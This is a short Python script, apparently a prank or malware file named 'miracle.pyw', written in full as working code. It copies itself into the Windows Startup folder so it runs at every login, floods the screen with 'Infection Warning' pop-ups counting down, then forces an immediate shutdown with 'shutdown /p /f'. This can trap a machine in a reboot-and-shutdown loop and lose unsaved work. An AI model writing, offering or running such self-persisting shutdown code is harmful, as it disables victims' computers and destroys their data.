import getpass
import threading
import time
import subprocess
import tkinter.messagebox

def mes(n):
    message = tkinter.messagebox.showwarning("Infection Warning", f"Your computer will shut-down in {int(n/4)} seconds.")

def main():
    threads = []
    startup_path = f"C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    with open("miracle.pyw", "r") as f, open(startup_path + "\\miracle.pyw", "w") as d:
        d.write(f.read())
    n = 120
    while n != 0:
        threads.append(threading.Thread(target=mes, args = (n,)))
        threads[-1].start()
        n -= 1
        time.sleep(0.25)
    subprocess.call('shutdown /p /f')


if __name__ == '__main__':
    main()
